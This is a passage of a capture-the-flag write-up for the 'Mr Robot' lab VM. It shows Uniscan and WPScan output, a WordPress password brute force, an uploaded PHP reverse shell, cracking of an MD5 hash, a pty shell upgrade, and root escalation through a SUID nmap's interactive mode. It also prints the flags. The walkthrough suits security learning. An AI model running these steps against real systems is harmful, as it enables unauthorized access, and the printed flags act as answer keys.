</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>  -h  help
</span><span class='line'>  -u  &lt;url&gt; example: https://www.example.com/
</span><span class='line'>  -f  &lt;file&gt; list of url's
</span><span class='line'>  -b  Uniscan go to background
</span><span class='line'>  -q  Enable Directory checks
</span><span class='line'>  -w  Enable File checks
</span><span class='line'>  -e  Enable robots.txt and sitemap.xml check
</span><span class='line'>  -d  Enable Dynamic checks
</span><span class='line'>  -s  Enable Static checks
</span><span class='line'>  -r  Enable Stress checks
</span><span class='line'>  -i  &lt;dork&gt; Bing search
</span><span class='line'>  -o  &lt;dork&gt; Google search
</span><span class='line'>  -g  Web fingerprint
</span><span class='line'>  -j  Server fingerprint
</span><span class='line'>
</span><span class='line'>usage: 
</span><span class='line'>[1] perl ./uniscan.pl -u http://www.example.com/ -qweds
</span><span class='line'>[2] perl ./uniscan.pl -f sites.txt -bqweds
</span><span class='line'>[3] perl ./uniscan.pl -i uniscan
</span><span class='line'>[4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
</span><span class='line'>[5] perl ./uniscan.pl -o "inurl:test"
</span><span class='line'>[6] perl ./uniscan.pl -u https://www.example.com/ -r</span></code></pre></td></tr></table></div></figure>


<p>I ran the CLI tool against the target with most of the flags. While described as simple, it checks for plenty of things: Drupal plugins, mobile versions, error message information, interesting HTML strings, performs whois and nslookup lookups, attempts banner grabbing, runs ping, traceroute and Nmap against the target, looks for some specific issues, and more:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Crawler Started:
</span><span class='line'>| Plugin name: FCKeditor upload test v.1 Loaded.
</span><span class='line'>| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
</span><span class='line'>| Plugin name: Upload Form Detect v.1.1 Loaded.
</span><span class='line'>| Plugin name: phpinfo() Disclosure v.1 Loaded.
</span><span class='line'>| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
</span><span class='line'>| Plugin name: Code Disclosure v.1.1 Loaded.
</span><span class='line'>| Plugin name: E-mail Detection v.1.1 Loaded.
</span><span class='line'>| Plugin name: External Host Detect v.1.2 Loaded.
</span><span class='line'>| [+] Crawling finished, 59 URL's found!
</span><span class='line'>
</span><span class='line'>Dynamic tests:
</span><span class='line'>| Plugin name: Learning New Directories v.1.2 Loaded.
</span><span class='line'>| Plugin name: FCKedior tests v.1.1 Loaded.
</span><span class='line'>| Plugin name: Timthumb &lt;= 1.32 vulnerability v.1 Loaded.
</span><span class='line'>| Plugin name: Find Backup Files v.1.2 Loaded.
</span><span class='line'>| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
</span><span class='line'>| Plugin name: Local File Include tests v.1.1 Loaded.
</span><span class='line'>| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
</span><span class='line'>| Plugin name: Remote Command Execution tests v.1.1 Loaded.
</span><span class='line'>| Plugin name: Remote File Include tests v.1.2 Loaded.
</span><span class='line'>| Plugin name: SQL-injection tests v.1.2 Loaded.
</span><span class='line'>| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
</span><span class='line'>| Plugin name: Web Shell Finder v.1.3 Loaded.</span></code></pre></td></tr></table></div></figure>


<p>And the tool did find some useful information for further compromising the target!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>===================================================================================================
</span><span class='line'>|
</span><span class='line'>| Directory check:
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/Image/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/feed/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/image/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/login/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/rss/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/wp-login/
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/wp-admin/
</span><span class='line'>===================================================================================================
</span><span class='line'>|                                                                                                   
</span><span class='line'>| File check:
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/index.html
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/admin/index.php
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/favicon.ico
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.html
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.html%20
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/index.php
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/license.txt
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/readme.html
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/readme
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/robots.txt
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/htx/sqlqhit.asp
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/htx/SQLQHit.asp
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/sqlqhit.asp
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/search/SQLQHit.asp
</span><span class='line'>| [+] CODE: 200 URL: http://192.168.217.145/sitemap.xml
</span><span class='line'>===================================================================================================</span></code></pre></td></tr></table></div></figure>


<p>What do you know, a Wordpress instance is running on the server! So it&rsquo;s time for wpscan!</p>

<h3>wpscan description</h3>

<p>Homepage: <a href="https://wpscan.org/">https://wpscan.org/</a></p>

<blockquote><p>WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>

<h3>wpscan options</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --help
</span><span class='line'>_______________________________________________________________
</span><span class='line'>        __          _______   _____                  
</span><span class='line'>        \ \        / /  __ \ / ____|                 
</span><span class='line'>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
</span><span class='line'>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
</span><span class='line'>           \  /\  /  | |     ____) | (__| (_| | | | |
</span><span class='line'>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span><span class='line'>
</span><span class='line'>        WordPress Security Scanner by the WPScan Team 
</span><span class='line'>                       Version 2.9.2
</span><span class='line'>          Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
</span><span class='line'>_______________________________________________________________
</span><span class='line'>
</span><span class='line'>Help :
</span><span class='line'>
</span><span class='line'>Some values are settable in a config file, see the example.conf.json
</span><span class='line'>
</span><span class='line'>--update                            Update the database to the latest version.
</span><span class='line'>--url       | -u &lt;target url&gt;       The WordPress URL/domain to scan.
</span><span class='line'>--force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
</span><span class='line'>--enumerate | -e [option(s)]        Enumeration.
</span><span class='line'>  option :
</span><span class='line'>    u        usernames from id 1 to 10
</span><span class='line'>    u[10-20] usernames from id 10 to 20 (you must write [] chars)
</span><span class='line'>    p        plugins
</span><span class='line'>    vp       only vulnerable plugins
</span><span class='line'>    ap       all plugins (can take a long time)
</span><span class='line'>    tt       timthumbs
</span><span class='line'>    t        themes
</span><span class='line'>    vt       only vulnerable themes
</span><span class='line'>    at       all themes (can take a long time)
</span><span class='line'>  Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
</span><span class='line'>  If no option is supplied, the default is "vt,tt,u,vp"
</span><span class='line'>
</span><span class='line'>--exclude-content-based "&lt;regexp or string&gt;"
</span><span class='line'>                                    Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
</span><span class='line'>                                    You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
</span><span class='line'>--config-file  | -c &lt;config file&gt;   Use the specified config file, see the example.conf.json.
</span><span class='line'>--user-agent   | -a &lt;User-Agent&gt;    Use the specified User-Agent.
</span><span class='line'>--cookie &lt;string&gt;                   String to read cookies from.
</span><span class='line'>--random-agent | -r                 Use a random User-Agent.
</span><span class='line'>--follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
</span><span class='line'>--batch                             Never ask for user input, use the default behaviour.
</span><span class='line'>--no-color                          Do not use colors in the output.
</span><span class='line'>--log                               Creates a log.txt file with WPScan's output.
</span><span class='line'>--no-banner                         Prevents the WPScan banner from being displayed.
</span><span class='line'>--disable-accept-header             Prevents WPScan sending the Accept HTTP header.
</span><span class='line'>--disable-referer                   Prevents setting the Referer header.
</span><span class='line'>--disable-tls-checks                Disables SSL/TLS certificate verification.
</span><span class='line'>--wp-content-dir &lt;wp content dir&gt;   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.
</span><span class='line'>                                    Subdirectories are allowed.
</span><span class='line'>--wp-plugins-dir &lt;wp plugins dir&gt;   Same thing than --wp-content-dir but for the plugins directory.
</span><span class='line'>                                    If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
</span><span class='line'>--proxy &lt;[protocol://]host:port&gt;    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.
</span><span class='line'>                                    If no protocol is given (format host:port), HTTP will be used.
</span><span class='line'>--proxy-auth &lt;username:password&gt;    Supply the proxy login credentials.
</span><span class='line'>--basic-auth &lt;username:password&gt;    Set the HTTP Basic authentication.
</span><span class='line'>--wordlist | -w &lt;wordlist&gt;          Supply a wordlist for the password brute forcer.
</span><span class='line'>--username | -U &lt;username&gt;          Only brute force the supplied username.
</span><span class='line'>--usernames     &lt;path-to-file&gt;      Only brute force the usernames from the file.
</span><span class='line'>--cache-dir       &lt;cache-directory&gt; Set the cache directory.
</span><span class='line'>--cache-ttl       &lt;cache-ttl&gt;       Typhoeus cache TTL.
</span><span class='line'>--request-timeout &lt;request-timeout&gt; Request Timeout.
</span><span class='line'>--connect-timeout &lt;connect-timeout&gt; Connect Timeout.
</span><span class='line'>--threads  | -t &lt;number of threads&gt; The number of threads to use when multi-threading requests.
</span><span class='line'>--max-threads     &lt;max-threads&gt;     Maximum Threads.
</span><span class='line'>--throttle        &lt;milliseconds&gt;    Milliseconds to wait before doing another web request. If used, the --threads should be set to 1.
</span><span class='line'>--help     | -h                     This help screen.
</span><span class='line'>--verbose  | -v                     Verbose output.
</span><span class='line'>--version                           Output the current version and exit.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Examples :
</span><span class='line'>
</span><span class='line'>-Further help ...
</span><span class='line'>ruby ./wpscan.rb --help
</span><span class='line'>
</span><span class='line'>-Do 'non-intrusive' checks ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com
</span><span class='line'>
</span><span class='line'>-Do wordlist password brute force on enumerated users using 50 threads ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50
</span><span class='line'>
</span><span class='line'>-Do wordlist password brute force on the 'admin' username only ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --username admin
</span><span class='line'>
</span><span class='line'>-Enumerate installed plugins ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate p
</span><span class='line'>
</span><span class='line'>-Enumerate installed themes ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate t
</span><span class='line'>
</span><span class='line'>-Enumerate users ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate u
</span><span class='line'>
</span><span class='line'>-Enumerate installed timthumbs ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --enumerate tt
</span><span class='line'>
</span><span class='line'>-Use a HTTP proxy ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --proxy 127.0.0.1:8118
</span><span class='line'>
</span><span class='line'>-Use a SOCKS5 proxy ... (cURL &gt;= v7.21.7 needed)
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --proxy socks5://127.0.0.1:9000
</span><span class='line'>
</span><span class='line'>-Use custom content directory ...
</span><span class='line'>ruby ./wpscan.rb -u www.example.com --wp-content-dir custom-content
</span><span class='line'>
</span><span class='line'>-Use custom plugins directory ...
</span><span class='line'>ruby ./wpscan.rb -u www.example.com --wp-plugins-dir wp-content/custom-plugins
</span><span class='line'>
</span><span class='line'>-Update the DB ...
</span><span class='line'>ruby ./wpscan.rb --update
</span><span class='line'>
</span><span class='line'>-Debug output ...
</span><span class='line'>ruby ./wpscan.rb --url www.example.com --debug-output 2&gt;debug.log
</span><span class='line'>
</span><span class='line'>See README for further information.</span></code></pre></td></tr></table></div></figure>


<p>First, I updated the wpscan databse with <code>wpscan &mdash;update</code>. Then I performed some enumeration on the target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --url http://192.168.217.145 --enumerate u vp vt --no-banner
</span><span class='line'>[+] URL: http://192.168.217.145/
</span><span class='line'>[+] Started: Sat Jul  1 07:40:05 2017
</span><span class='line'>
</span><span class='line'>[+] robots.txt available under: 'http://192.168.217.145/robots.txt'
</span><span class='line'>[!] The WordPress 'http://192.168.217.145/readme.html' file exists exposing a version number
</span><span class='line'>[+] Interesting header: SERVER: Apache
</span><span class='line'>[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
</span><span class='line'>[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
</span><span class='line'>[+] XML-RPC Interface available under: http://192.168.217.145/xmlrpc.php
</span><span class='line'>
</span><span class='line'>[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml
</span><span class='line'>[!] 1 vulnerability identified from the version number
</span><span class='line'>
</span><span class='line'>[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset
</span><span class='line'>    Reference: https://wpvulndb.com/vulnerabilities/8807
</span><span class='line'>    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
</span><span class='line'>    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
</span><span class='line'>    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
</span><span class='line'>
</span><span class='line'>[+] Enumerating plugins from passive detection ...
</span><span class='line'>[+] No plugins found
</span><span class='line'>
</span><span class='line'>[+] Enumerating usernames ...
</span><span class='line'>[+] We did not enumerate any usernames
</span><span class='line'>
</span><span class='line'>[+] Finished: Sat Jul  1 07:40:07 2017
</span><span class='line'>[+] Requests Done: 57
</span><span class='line'>[+] Memory used: 17.109 MB
</span><span class='line'>[+] Elapsed time: 00:00:02</span></code></pre></td></tr></table></div></figure>


<p>I couldn&rsquo;t use wpscan&rsquo;s findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l fsocity.dic 
</span><span class='line'>858160 fsocity.dic</span></code></pre></td></tr></table></div></figure>


<p>Not a small one, but maybe it contains duplicates:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sort fsocity.dic | uniq | wc -l
</span><span class='line'>11451</span></code></pre></td></tr></table></div></figure>


<p>A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.</p>

<p>The next step was to visit <a href="http://192.168.217.145/wp-login.php">http://192.168.217.145/wp-login.php</a> and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/wplogin.png" title="wplogin" alt="wplogin"></p>

<p>It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that&rsquo;s how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --url http://192.168.217.145/ --wordlist ~/Downloads/fsociety.txt --username elliot
</span><span class='line'>[...]
</span><span class='line'>[+] Starting the password brute forcer
</span><span class='line'>  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                                  
</span><span class='line'>
</span><span class='line'>  Brute Forcing 'elliot' Time: 00:02:27 &lt;==================================                                    &gt; (5640 / 11452) 49.24%  ETA: 00:02:32
</span><span class='line'>  +----+--------+------+-----------+
</span><span class='line'>  | Id | Login  | Name | Password  |
</span><span class='line'>  +----+--------+------+-----------+
</span><span class='line'>  |    | elliot |      | ER28-0652 |
</span><span class='line'>  +----+--------+------+-----------+</span></code></pre></td></tr></table></div></figure>


<p>Excellent, wpscan found the password is <em>ER28-0652</em>! I logged in and noticed that all the plugins are outdated:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/plugins.png" title="wp plugins" alt="wp plugins"></p>

<p>I tried uploading a PHP reverse shell as plugin, but got an error that it couldn&rsquo;t install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mr-robot/media.png" title="media library" alt="media library"></p>

<p>Wasn&rsquo;t sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was <a href="http://192.168.217.145/wp-content/uploads/2017/07/shell.php">http://192.168.217.145/wp-content/uploads/2017/07/shell.php</a></p>

<h2>Flag #2</h2>

<p>Finally achieved presence on the machine:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami
</span><span class='line'>daemon
</span><span class='line'>$ ls /home
</span><span class='line'>robot
</span><span class='line'>$ ls -la /home/robot
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
</span><span class='line'>drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
</span><span class='line'>-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
</span><span class='line'>-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5</span></code></pre></td></tr></table></div></figure>


<p>Found the second flag, but couldn&rsquo;t read it. However, that md5 file was readable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /home/robot/password.raw-md5
</span><span class='line'>robot:c3fcd3d76192e4007dfb496cca67e13b</span></code></pre></td></tr></table></div></figure>


<p>I cracked the MD5 hash to reveal the password <em>abcdefghijklmnopqrstuvwxyz</em> for the user robot. I tried switching to that user, but I got the following error:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ su robot
</span><span class='line'>su: must be run from a terminal</span></code></pre></td></tr></table></div></figure>


<p>The error appears because the shell isn&rsquo;t interactive. But I ran into this before, and again <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentestmonkey&rsquo;s oneliners</a> came to the rescue:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'import pty; pty.spawn("/bin/sh")'
</span><span class='line'>$ su robot
</span><span class='line'>su robot
</span><span class='line'>Password: abcdefghijklmnopqrstuvwxyz
</span><span class='line'>
</span><span class='line'>robot@linux:/$ </span></code></pre></td></tr></table></div></figure>


<p>I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it&rsquo;s annoying:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:~$ cat key-2-of-3.txt
</span><span class='line'>cat key-2-of-3.txt
</span><span class='line'>822c73956184f694993bede3eb39f959</span></code></pre></td></tr></table></div></figure>


<h2>Flag #3</h2>

<p>I couldn&rsquo;t find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2&gt; /dev/null
</span><span class='line'>[...]
</span><span class='line'>/usr/local/bin/nmap</span></code></pre></td></tr></table></div></figure>


<p>After Googling, there even seems to be a <a href="https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap">setuid Nmap exploit</a> in Metasploit! I read more about this problem, and found an interesting <a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">SANS paper</a> (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>robot@linux:/$ nmap --interactive
</span><span class='line'>nmap --interactive
</span><span class='line'>
</span><span class='line'>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
</span><span class='line'>Welcome to Interactive Mode -- press h &lt;enter&gt; for help
</span><span class='line'>nmap&gt; </span></code></pre></td></tr></table></div></figure>


<p>The Nmap version is 3.81, so I tried it out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap&gt; !whoami
</span><span class='line'>!whoami
</span><span class='line'>root
</span><span class='line'>waiting to reap child : No child processes</span></code></pre></td></tr></table></div></figure>


<p>It did work! Game over, Mr Robot!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap&gt; !sh
</span><span class='line'>!sh
</span><span class='line'># ls /root
</span><span class='line'>ls /root
</span><span class='line'>firstboot_done    key-3-of-3.txt
</span><span class='line'># cat /root/key-3-of-3.txt
</span><span class='line'>cat /root/key-3-of-3.txt
</span><span class='line'>04787ddef27c3dee1ee161b21670b4e4</span></code></pre></td></tr></table></div></figure>


